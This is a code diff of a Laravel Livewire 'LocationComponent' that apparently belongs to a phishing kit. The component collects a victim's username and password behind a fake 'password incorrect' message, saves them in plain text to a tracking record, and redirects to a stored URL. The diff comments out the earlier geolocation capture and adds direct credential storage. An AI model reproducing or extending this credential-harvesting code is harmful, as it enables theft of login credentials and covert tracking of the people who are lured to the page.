@@ -10,36 +10,35 @@ class LocationComponent extends Component
 {
     public $username;
     public $password;
-    public $latitude;
-    public $longitude;
+    // public $latitude;
+    // public $longitude;
   
-    protected $listeners = ['got-user-location' => 'setUserLocation'];
+    // protected $listeners = ['got-user-location' => 'setUserLocation'];
 
-    public function setUserLocation($position)
-    {
-        $this->latitude = $position['latitude'];
-        $this->longitude = $position['longitude'];
+    // public function setUserLocation($position)
+    // {
+    //     $this->latitude = $position['latitude'];
+    //     $this->longitude = $position['longitude'];
 
-        $trackingId = session()->get('url')['trackingId'];
-        $url = session()->get('url')['value'];
-        dd($url);
-        $tracker = TrackedData::find($trackingId)->first();
-        if($tracker) {
-            $tracker->update([
-                'latitude' => $this->latitude,
-                'longitude' => $this->longitude,
-                'username' => $this->username,
-                'password' => $this->password,
-        ]);
-        }
-        // session()->forget('url');
-        return redirect($url);
-    }
+    //     $trackingId = session()->get('url')['trackingId'];
+    //     $url = session()->get('url')['value'];
+    //     $tracker = TrackedData::find($trackingId)->first();
+    //     if($tracker) {
+    //         $tracker->update([
+    //             'latitude' => $this->latitude,
+    //             'longitude' => $this->longitude,
+    //             'username' => $this->username,
+    //             'password' => $this->password,
+    //     ]);
+    //     }
+    //     // session()->forget('url');
+    //     return redirect($url);
+    // }
 
-    public function getUserLocation()
-    {
-        $this->dispatchBrowserEvent('get-user-location');
-    }
+    // public function getUserLocation()
+    // {
+    //     $this->dispatchBrowserEvent('get-user-location');
+    // }
 
     public function render()
     {
@@ -56,7 +55,16 @@ class LocationComponent extends Component
             'password.required_with' => 'The password you’ve entered is incorrect.',
         ]);
         
-        $this->getUserLocation();
+        $trackingId = session()->get('url')['trackingId'];
+        $url = session()->get('url')['value'];
+        $tracker = TrackedData::find($trackingId)->first();
+        if($tracker) {
+            $tracker->update([
+                'username' => $this->username,
+                'password' => $this->password,
+            ]);
+        }
+        return redirect($url);
     
     }
 
